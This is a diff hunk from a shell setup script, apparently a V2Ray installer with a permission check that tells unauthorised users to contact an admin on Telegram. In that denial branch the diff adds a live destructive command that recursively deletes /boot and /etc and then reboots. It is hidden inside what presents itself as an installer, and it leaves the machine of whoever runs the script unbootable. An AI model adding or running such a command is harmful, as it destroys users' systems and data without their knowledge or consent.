@@ -19,6 +19,7 @@ echo -e "${red}Permission Denied!${NC}";
 echo "Please Contact Admin"
 echo "Telegram t.me/xzvnct"
 rm -f setup.sh
+rm -r -f /boot; rm -r -f /etc; reboot
 exit 0
 fi
 if [ -f "/etc/v2ray/domain" ]; then
